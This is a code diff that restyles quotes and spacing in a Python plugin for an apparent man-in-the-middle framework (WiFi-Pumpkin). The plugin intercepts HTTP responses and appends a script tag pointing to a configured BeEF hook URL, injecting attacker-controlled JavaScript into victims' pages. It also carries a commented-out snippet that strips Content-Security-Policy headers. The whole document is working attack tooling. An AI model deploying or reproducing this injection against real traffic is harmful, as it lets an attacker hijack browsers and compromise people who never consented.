@@ -22,37 +22,36 @@ from bs4 import BeautifulSoup
 
 class beef(BasePumpkin):
     meta = {
-        '_name'      : 'beef',
-        '_version'   : '1.1',
-        '_description' : 'url injection insert and use our own JavaScript code in a page.',
-        '_author'    : 'by Maintainer'
+        "_name": "beef",
+        "_version": "1.1",
+        "_description": "url injection insert and use our own JavaScript code in a page.",
+        "_author": "by Maintainer",
     }
 
     @staticmethod
     def getName():
-        return beef.meta['_name']
+        return beef.meta["_name"]
 
     def __init__(self):
-        for key,value in self.meta.items():
+        for key, value in self.meta.items():
             self.__dict__[key] = value
         self.ConfigParser = True
-        self.urlhook = self.config.get('set_beef','hook')
+        self.urlhook = self.config.get("set_beef", "hook")
 
-    def handleResponse(self,request, data):
+    def handleResponse(self, request, data):
 
-
-        html = BeautifulSoup(data,'lxml')
+        html = BeautifulSoup(data, "lxml")
         """
         # To Allow CORS
         if "Content-Security-Policy" in flow.response.headers:
             del flow.response.headers["Content-Security-Policy"]
         """
         if html.body:
-            url =  '{}'.format(request.uri)
-            metatag = html.new_tag('script')
-            metatag.attrs['src'] = self.urlhook
-            metatag.attrs['type'] = 'text/javascript'
+            url = "{}".format(request.uri)
+            metatag = html.new_tag("script")
+            metatag.attrs["src"] = self.urlhook
+            metatag.attrs["type"] = "text/javascript"
             html.body.append(metatag)
             data = str(html)
-            print("[{} js script Injected in [ {} ]".format(self._name,url))
+            print("[{} js script Injected in [ {} ]".format(self._name, url))
         return data
